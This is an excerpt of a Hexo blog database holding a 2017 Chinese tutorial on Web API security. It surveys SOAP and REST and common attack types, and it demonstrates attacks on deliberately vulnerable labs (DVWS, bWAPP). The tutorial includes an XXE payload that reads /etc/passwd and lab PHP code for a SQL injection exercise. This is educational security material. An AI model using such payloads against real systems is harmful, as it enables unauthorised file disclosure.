https://hexo.io/plugins/</div><div class=\"line\">      ## Themes: https://hexo.io/themes/</div><div class=\"line\">      theme: spfk</div><div class=\"line\">--------------------</div></pre></td></tr></table></figure>\n<h3 id=\"插件配置\"><a href=\"#插件配置\" class=\"headerlink\" title=\"插件配置\"></a>插件配置</h3><p><a href=\"https://github.com/CodeFalling/hexo-asset-image\">图片辅助工具hexo-asset-image</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install https://github.com/CodeFalling/hexo-asset-image --save</div></pre></td></tr></table></figure></p>"},{"title":"Web API接口安全了解","date":"2017-07-11T06:55:22.000Z","_content":">   2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。\n\n# 了解Web Service（API）\n    Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n\n<!-- more -->\n\n## 主流Web Service实现方式\n### SOAP/XML\n    简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n\n### REST/JSON\n    表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\n    PS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\nXML示例:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\t<person>\n\t\t<name>Jason</name>\n\t\t<age>99</age>\n\t\t<sex>male</sex>\n\t\t<contact>\n\t\t\t<mobile>13888888888</mobile>\n\t\t\t<email>bingo@tass.com.cn</email>\n\t\t\t<wechat>bingo</wechat>\n\t\t</contact>\n\t</person>\n```\nJSON示例:\n```\n{\n  \"person\": {\n    \"name\": \"Jason\",\n    \"age\": \"99\",\n    \"sex\": \"male\",\n    \"contact\": {\n      \"mobile\": \"13888888888\",\n      \"email\": \"bingo@tass.com.cn\",\n      \"wechat\": \"bingo\"\n    }\n  }\n}\n```\n\n# API安全\n\n## API的安全要素\n\n- 认证和鉴权 - 认证用户身份 & 确定用户权限\n\n    通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。\n- 加密和签名 - 保证信息的保密性和完整性\n\n    通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。\n\n- 漏洞 - 注入攻击 & 敏感数据泄露 & 越权访问\n\n## 攻击面检测\n- 尽可能多的了解API端点、消息、参数、行为。\n- 发现API中可能存在问题的元数据。\n- 记录流量进一步学习API\n- 爆破 - 暴力破解路径或资源\n\n## 攻击方式\n1.模糊测试\n\n    使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n2.注入攻击\n\n    使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n3.无效/越界内容\n\n    尝试各种无效或者超范围的内容，并验证响应信息。\n4.恶意内容\n\n    在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n5.XSS\n\n    上传常见攻击向量进行XSS（反射型，存储型等）测试。\n6.CSRF\n\n    测试API是否含有token，token是否能复用，是否可被伪造。\n7.不安全的直接对象引用\n\n    尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n8.其它考虑\n\n    会话认证（token是否正确使用）\n    安全配置（前述攻击照成系统/应用等信息泄露）\n\n# 攻击演示\n## 1. DVWS | WSDL Enumeration\n前端页面\n![](Web-API接口安全了解/screenshot01.png)\n\n源码中暴露wsdl文件\n![](Web-API接口安全了解/screenshot02.png)\n\nwsdl文件中可以查看到四种方法\n![](Web-API接口安全了解/screenshot03.png)\n\n使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试\n\n尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。\n![](Web-API接口安全了解/screenshot04.png)\n\n## 2. DVWS | XML External Entity Processing\n\n提交正常请求:\n```\n<name>Mr.Bingo</name>\n```\n\n![](Web-API接口安全了解/screenshot21.png)\n提交payload:\n```\n<?xml version=\"1.0\"?> <!DOCTYPE bingo [  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><name>&xxe;</name>\n```\n![](Web-API接口安全了解/screenshot24.png)\n\n额外测试：\n\n![](Web-API接口安全了解/screenshot22.png)\n![](Web-API接口安全了解/screenshot23.png)\n\n## 3. DVWS | Server Side Request Forgery\n正常数据请求\n\n![](Web-API接口安全了解/screenshot31.png)\n篡改请求URL\n\n![](Web-API接口安全了解/screenshot32.png)\n\n## 4. DVWS | REST API SQL Injection\n正常请求资源：\n\n![](Web-API接口安全了解/screenshot41.png)\n\nSQL注入：\n\n![](Web-API接口安全了解/screenshot42.png)\n\n## 5. bWAPP | SQL Injection - Blind (WS/SOAP)\n由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考\n```\n<?php\nif(isset($_REQUEST[\"title\"]))\n{   \n    // Includes the NuSOAP library\n    require_once(\"soap/nusoap.php\");\n\n    // Creates an instance of the soap_client class\n    $client = new nusoap_client(\"http://localhost/bWAPP/ws_soap.php\");\n\n    // Calls the SOAP function\n    $tickets_stock = $client->call(\"get_tickets_stock\", array(\"title\" => sqli($_REQUEST[\"title\"])));\n\n    echo \"We have <b>\" . $tickets_stock . \"</b> movie tickets available in our stock.\";\n}\n?>\n```\n![](Web-API接口安全了解/screenshot50.png)\n\n>   当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。\n\n# 参考资料\n## 测试工具\n- Ready!API ( SoapUI )\n- Burpsuite\n- FuzzAPI\n## 测试平台\n\n- DVWS  [https://github.com/snoopythesecuritydog/dvws](https://github.com/snoopythesecuritydog/dvws)\n\n- bWAPP [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)\n\n- Hackazon  [https://github.com/rapid7/hackazon](https://github.com/rapid7/hackazon)\n\n    Web Version [http://hackazon.webscantest.com](http://hackazon.webscantest.com)\n- Mutillidae    [https://sourceforge.net/projects/mutillidae/](https://sourceforge.net/projects/mutillidae/)\n\n- Juice-shop    [https://github.com/bkimminich/juice-shop](https://github.com/bkimminich/juice-shop)\n\n\n## 参考资料\n- OWASP Top 10 - 2017 RC1\n\n- REST API 安全设计指南 [http://www.freebuf.com/articles/web/82108.html](http://www.freebuf.com/articles/web/82108.html)\n\n- REST Security Cheat Sheet [https://www.owasp.org/index.php/REST_Security_Cheat_Sheet](https://www.owasp.org/index.php/REST_Security_Cheat_Sheet)","source":"_posts/Web-API接口安全了解.md","raw":"---\ntitle: Web API接口安全了解\ndate: 2017-07-11 14:55:22\ntags: 接口安全\n---\n>   2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。\n\n# 了解Web Service（API）\n    Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n\n<!-- more -->\n\n## 主流Web Service实现方式\n### SOAP/XML\n    简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n\n### REST/JSON\n    表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\n    PS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\nXML示例:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\t<person>\n\t\t<name>Jason</name>\n\t\t<age>99</age>\n\t\t<sex>male</sex>\n\t\t<contact>\n\t\t\t<mobile>13888888888</mobile>\n\t\t\t<email>bingo@tass.com.cn</email>\n\t\t\t<wechat>bingo</wechat>\n\t\t</contact>\n\t</person>\n```\nJSON示例:\n```\n{\n  \"person\": {\n    \"name\": \"Jason\",\n    \"age\": \"99\",\n    \"sex\": \"male\",\n    \"contact\": {\n      \"mobile\": \"13888888888\",\n      \"email\": \"bingo@tass.com.cn\",\n      \"wechat\": \"bingo\"\n    }\n  }\n}\n```\n\n# API安全\n\n## API的安全要素\n\n- 认证和鉴权 - 认证用户身份 & 确定用户权限\n\n    通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。\n- 加密和签名 - 保证信息的保密性和完整性\n\n    通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。\n\n- 漏洞 - 注入攻击 & 敏感数据泄露 & 越权访问\n\n## 攻击面检测\n- 尽可能多的了解API端点、消息、参数、行为。\n- 发现API中可能存在问题的元数据。\n- 记录流量进一步学习API\n- 爆破 - 暴力破解路径或资源\n\n## 攻击方式\n1.模糊测试\n\n    使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n2.注入攻击\n\n    使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n3.无效/越界内容\n\n    尝试各种无效或者超范围的内容，并验证响应信息。\n4.恶意内容\n\n    在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n5.XSS\n\n    上传常见攻击向量进行XSS（反射型，存储型等）测试。\n6.CSRF\n\n    测试API是否含有token，token是否能复用，是否可被伪造。\n7.不安全的直接对象引用\n\n    尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n8.其它考虑\n\n    会话认证（token是否正确使用）\n    安全配置（前述攻击照成系统/应用等信息泄露）\n\n# 攻击演示\n## 1. DVWS | WSDL Enumeration\n前端页面\n![](Web-API接口安全了解/screenshot01.png)\n\n源码中暴露wsdl文件\n![](Web-API接口安全了解/screenshot02.png)\n\nwsdl文件中可以查看到四种方法\n![](Web-API接口安全了解/screenshot03.png)\n\n使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试\n\n尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。\n![](Web-API接口安全了解/screenshot04.png)\n\n## 2. DVWS | XML External Entity Processing\n\n提交正常请求:\n```\n<name>Mr.Bingo</name>\n```\n\n![](Web-API接口安全了解/screenshot21.png)\n提交payload:\n```\n<?xml version=\"1.0\"?> <!DOCTYPE bingo [  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><name>&xxe;</name>\n```\n![](Web-API接口安全了解/screenshot24.png)\n\n额外测试：\n\n![](Web-API接口安全了解/screenshot22.png)\n![](Web-API接口安全了解/screenshot23.png)\n\n## 3. DVWS | Server Side Request Forgery\n正常数据请求\n\n![](Web-API接口安全了解/screenshot31.png)\n篡改请求URL\n\n![](Web-API接口安全了解/screenshot32.png)\n\n## 4. DVWS | REST API SQL Injection\n正常请求资源：\n\n![](Web-API接口安全了解/screenshot41.png)\n\nSQL注入：\n\n![](Web-API接口安全了解/screenshot42.png)\n\n## 5. bWAPP | SQL Injection - Blind (WS/SOAP)\n由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考\n```\n<?php\nif(isset($_REQUEST[\"title\"]))\n{   \n    // Includes the NuSOAP library\n    require_once(\"soap/nusoap.php\");\n\n    // Creates an instance of the soap_client class\n    $client = new nusoap_client(\"http://localhost/bWAPP/ws_soap.php\");\n\n    // Calls the SOAP function\n    $tickets_stock = $client->call(\"get_tickets_stock\", array(\"title\" => sqli($_REQUEST[\"title\"])));\n\n    echo \"We have <b>\" . $tickets_stock . \"</b> movie tickets available in our stock.\";\n}\n?>\n```\n![](Web-API接口安全了解/screenshot50.png)\n\n>   当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。\n\n# 参考资料\n## 测试工具\n- Ready!API ( SoapUI )\n- Burpsuite\n- FuzzAPI\n## 测试平台\n\n- DVWS  [https://github.com/snoopythesecuritydog/dvws](https://github.com/snoopythesecuritydog/dvws)\n\n- bWAPP [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)\n\n- Hackazon  [https://github.com/rapid7/hackazon](https://github.com/rapid7/hackazon)\n\n    Web Version [http://hackazon.webscantest.com](http://hackazon.webscantest.com)\n- Mutillidae    [https://sourceforge.net/projects/mutillidae/](https://sourceforge.net/projects/mutillidae/)\n\n- Juice-shop    [https://github.com/bkimminich/juice-shop](https://github.com/bkimminich/juice-shop)\n\n\n## 参考资料\n- OWASP Top 10 - 2017 RC1\n\n- REST API 安全设计指南 [http://www.freebuf.com/articles/web/82108.html](http://www.freebuf.com/articles/web/82108.html)\n\n- REST Security Cheat Sheet [https://www.owasp.org/index.php/REST_Security_Cheat_Sheet](https://www.owasp.org/index.php/REST_Security_Cheat_Sheet)","slug":"Web-API接口安全了解","published":1,"updated":"2017-07-11T11:09:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsl000k97uv24tbtp8l","content":"<blockquote>\n<p>  2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。</p>\n</blockquote>\n<h1 id=\"了解Web-Service（API）\"><a href=\"#了解Web-Service（API）\" class=\"headerlink\" title=\"了解Web Service（API）\"></a>了解Web Service（API）</h1><pre><code>Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n</code></pre><a id=\"more\"></a>\n<h2 id=\"主流Web-Service实现方式\"><a href=\"#主流Web-Service实现方式\" class=\"headerlink\" title=\"主流Web Service实现方式\"></a>主流Web Service实现方式</h2><h3 id=\"SOAP-XML\"><a href=\"#SOAP-XML\" class=\"headerlink\" title=\"SOAP/XML\"></a>SOAP/XML</h3><pre><code>简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n</code></pre><h3 id=\"REST-JSON\"><a href=\"#REST-JSON\" class=\"headerlink\" title=\"REST/JSON\"></a>REST/JSON</h3><pre><code>表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\nPS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\n</code></pre><p>XML示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class=\"line\">\t&lt;person&gt;</div><div class=\"line\">\t\t&lt;name&gt;Jason&lt;/name&gt;</div><div class=\"line\">\t\t&lt;age&gt;99&lt;/age&gt;</div><div class=\"line\">\t\t&lt;sex&gt;male&lt;/sex&gt;</div><div class=\"line\">\t\t&lt;contact&gt;</div><div class=\"line\">\t\t\t&lt;mobile&gt;13888888888&lt;/mobile&gt;</div><div class=\"line\">\t\t\t&lt;email&gt;bingo@tass.com.cn&lt;/email&gt;</div><div class=\"line\">\t\t\t&lt;wechat&gt;bingo&lt;/wechat&gt;</div><div class=\"line\">\t\t&lt;/contact&gt;</div><div class=\"line\">\t&lt;/person&gt;</div></pre></td></tr></table></figure></p>\n<p>JSON示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">  &quot;person&quot;: &#123;</div><div class=\"line\">    &quot;name&quot;: &quot;Jason&quot;,</div><div class=\"line\">    &quot;age&quot;: &quot;99&quot;,</div><div class=\"line\">    &quot;sex&quot;: &quot;male&quot;,</div><div class=\"line\">    &quot;contact&quot;: &#123;</div><div class=\"line\">      &quot;mobile&quot;: &quot;13888888888&quot;,</div><div class=\"line\">      &quot;email&quot;: &quot;bingo@tass.com.cn&quot;,</div><div class=\"line\">      &quot;wechat&quot;: &quot;bingo&quot;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"API安全\"><a href=\"#API安全\" class=\"headerlink\" title=\"API安全\"></a>API安全</h1><h2 id=\"API的安全要素\"><a href=\"#API的安全要素\" class=\"headerlink\" title=\"API的安全要素\"></a>API的安全要素</h2><ul>\n<li><p>认证和鉴权 - 认证用户身份 &amp; 确定用户权限</p>\n<p>  通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。</p>\n</li>\n<li><p>加密和签名 - 保证信息的保密性和完整性</p>\n<p>  通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。</p>\n</li>\n<li><p>漏洞 - 注入攻击 &amp; 敏感数据泄露 &amp; 越权访问</p>\n</li>\n</ul>\n<h2 id=\"攻击面检测\"><a href=\"#攻击面检测\" class=\"headerlink\" title=\"攻击面检测\"></a>攻击面检测</h2><ul>\n<li>尽可能多的了解API端点、消息、参数、行为。</li>\n<li>发现API中可能存在问题的元数据。</li>\n<li>记录流量进一步学习API</li>\n<li>爆破 - 暴力破解路径或资源</li>\n</ul>\n<h2 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h2><p>1.模糊测试</p>\n<pre><code>使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n</code></pre><p>2.注入攻击</p>\n<pre><code>使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n</code></pre><p>3.无效/越界内容</p>\n<pre><code>尝试各种无效或者超范围的内容，并验证响应信息。\n</code></pre><p>4.恶意内容</p>\n<pre><code>在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n</code></pre><p>5.XSS</p>\n<pre><code>上传常见攻击向量进行XSS（反射型，存储型等）测试。\n</code></pre><p>6.CSRF</p>\n<pre><code>测试API是否含有token，token是否能复用，是否可被伪造。\n</code></pre><p>7.不安全的直接对象引用</p>\n<pre><code>尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n</code></pre><p>8.其它考虑</p>\n<pre><code>会话认证（token是否正确使用）\n安全配置（前述攻击照成系统/应用等信息泄露）\n</code></pre><h1 id=\"攻击演示\"><a href=\"#攻击演示\" class=\"headerlink\" title=\"攻击演示\"></a>攻击演示</h1><h2 id=\"1-DVWS-WSDL-Enumeration\"><a href=\"#1-DVWS-WSDL-Enumeration\" class=\"headerlink\" title=\"1. DVWS | WSDL Enumeration\"></a>1. DVWS | WSDL Enumeration</h2><p>前端页面<br><img src=\"/2017/07/Web-API接口安全了解/screenshot01.png\" alt=\"\"></p>\n<p>源码中暴露wsdl文件<br><img src=\"/2017/07/Web-API接口安全了解/screenshot02.png\" alt=\"\"></p>\n<p>wsdl文件中可以查看到四种方法<br><img src=\"/2017/07/Web-API接口安全了解/screenshot03.png\" alt=\"\"></p>\n<p>使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试</p>\n<p>尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。<br><img src=\"/2017/07/Web-API接口安全了解/screenshot04.png\" alt=\"\"></p>\n<h2 id=\"2-DVWS-XML-External-Entity-Processing\"><a href=\"#2-DVWS-XML-External-Entity-Processing\" class=\"headerlink\" title=\"2. DVWS | XML External Entity Processing\"></a>2. DVWS | XML External Entity Processing</h2><p>提交正常请求:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;name&gt;Mr.Bingo&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot21.png\" alt=\"\"><br>提交payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE bingo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot24.png\" alt=\"\"></p>\n<p>额外测试：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot22.png\" alt=\"\"><br><img src=\"/2017/07/Web-API接口安全了解/screenshot23.png\" alt=\"\"></p>\n<h2 id=\"3-DVWS-Server-Side-Request-Forgery\"><a href=\"#3-DVWS-Server-Side-Request-Forgery\" class=\"headerlink\" title=\"3. DVWS | Server Side Request Forgery\"></a>3. DVWS | Server Side Request Forgery</h2><p>正常数据请求</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot31.png\" alt=\"\"><br>篡改请求URL</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot32.png\" alt=\"\"></p>\n<h2 id=\"4-DVWS-REST-API-SQL-Injection\"><a href=\"#4-DVWS-REST-API-SQL-Injection\" class=\"headerlink\" title=\"4. DVWS | REST API SQL Injection\"></a>4. DVWS | REST API SQL Injection</h2><p>正常请求资源：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot41.png\" alt=\"\"></p>\n<p>SQL注入：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot42.png\" alt=\"\"></p>\n<h2 id=\"5-bWAPP-SQL-Injection-Blind-WS-SOAP\"><a href=\"#5-bWAPP-SQL-Injection-Blind-WS-SOAP\" class=\"headerlink\" title=\"5. bWAPP | SQL Injection - Blind (WS/SOAP)\"></a>5. bWAPP | SQL Injection - Blind (WS/SOAP)</h2><p>由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">if(isset($_REQUEST[&quot;title&quot;]))</div><div class=\"line\">&#123;   </div><div class=\"line\">    // Includes the NuSOAP library</div><div class=\"line\">    require_once(&quot;soap/nusoap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Creates an instance of the soap_client class</div><div class=\"line\">    $client = new nusoap_client(&quot;http://localhost/bWAPP/ws_soap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Calls the SOAP function</div><div class=\"line\">    $tickets_stock = $client-&gt;call(&quot;get_tickets_stock&quot;, array(&quot;title&quot; =&gt; sqli($_REQUEST[&quot;title&quot;])));</div><div class=\"line\"></div><div class=\"line\">    echo &quot;We have &lt;b&gt;&quot; . $tickets_stock . &quot;&lt;/b&gt; movie tickets available in our stock.&quot;;</div><div class=\"line\">&#125;</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot50.png\" alt=\"\"></p>\n<blockquote>\n<p>  当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。</p>\n</blockquote>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"测试工具\"><a href=\"#测试工具\" class=\"headerlink\" title=\"测试工具\"></a>测试工具</h2><ul>\n<li>Ready!API ( SoapUI )</li>\n<li>Burpsuite</li>\n<li><p>FuzzAPI</p>\n<h2 id=\"测试平台\"><a href=\"#测试平台\" class=\"headerlink\" title=\"测试平台\"></a>测试平台</h2></li>\n<li><p>DVWS  <a href=\"https://github.com/snoopythesecuritydog/dvws\" target=\"_blank\" rel=\"external\">https://github.com/snoopythesecuritydog/dvws</a></p>\n</li>\n<li><p>bWAPP <a href=\"https://sourceforge.net/projects/bwapp/\" target=\"_blank\" rel=\"external\">https://sourceforge.net/projects/bwapp/</a></p>\n</li>\n<li><p>Hackazon  <a href=\"https://github.com/rapid7/hackazon\" target=\"_blank\" rel=\"external\">https://github.com/rapid7/hackazon</a></p>\n<p>  Web Version <a href=\"http://hackazon.webscantest.com\" target=\"_blank\" rel=\"external\">http://hackazon.webscantest.com</a></p>\n</li>\n<li><p>Mutillidae    <a href=\"https://sourceforge.net/projects/mutillidae/\" target=\"_blank\" rel=\"external\">https://sourceforge.net/projects/mutillidae/</a></p>\n</li>\n<li><p>Juice-shop    <a href=\"https://github.com/bkimminich/juice-shop\" target=\"_blank\" rel=\"external\">https://github.com/bkimminich/juice-shop</a></p>\n</li>\n</ul>\n<h2 id=\"参考资料-1\"><a href=\"#参考资料-1\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>OWASP Top 10 - 2017 RC1</p>\n</li>\n<li><p>REST API 安全设计指南 <a href=\"http://www.freebuf.com/articles/web/82108.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/web/82108.html</a></p>\n</li>\n<li><p>REST Security Cheat Sheet <a href=\"https://www.owasp.org/index.php/REST_Security_Cheat_Sheet\" target=\"_blank\" rel=\"external\">https://www.owasp.org/index.php/REST_Security_Cheat_Sheet</a></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。</p>\n</blockquote>\n<h1 id=\"了解Web-Service（API）\"><a href=\"#了解Web-Service（API）\" class=\"headerlink\" title=\"了解Web Service（API）\"></a>了解Web Service（API）</h1><pre><code>Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n</code></pre>","more":"<h2 id=\"主流Web-Service实现方式\"><a href=\"#主流Web-Service实现方式\" class=\"headerlink\" title=\"主流Web Service实现方式\"></a>主流Web Service实现方式</h2><h3 id=\"SOAP-XML\"><a href=\"#SOAP-XML\" class=\"headerlink\" title=\"SOAP/XML\"></a>SOAP/XML</h3><pre><code>简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n</code></pre><h3 id=\"REST-JSON\"><a href=\"#REST-JSON\" class=\"headerlink\" title=\"REST/JSON\"></a>REST/JSON</h3><pre><code>表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\nPS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\n</code></pre><p>XML示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class=\"line\">\t&lt;person&gt;</div><div class=\"line\">\t\t&lt;name&gt;Jason&lt;/name&gt;</div><div class=\"line\">\t\t&lt;age&gt;99&lt;/age&gt;</div><div class=\"line\">\t\t&lt;sex&gt;male&lt;/sex&gt;</div><div class=\"line\">\t\t&lt;contact&gt;</div><div class=\"line\">\t\t\t&lt;mobile&gt;13888888888&lt;/mobile&gt;</div><div class=\"line\">\t\t\t&lt;email&gt;bingo@tass.com.cn&lt;/email&gt;</div><div class=\"line\">\t\t\t&lt;wechat&gt;bingo&lt;/wechat&gt;</div><div 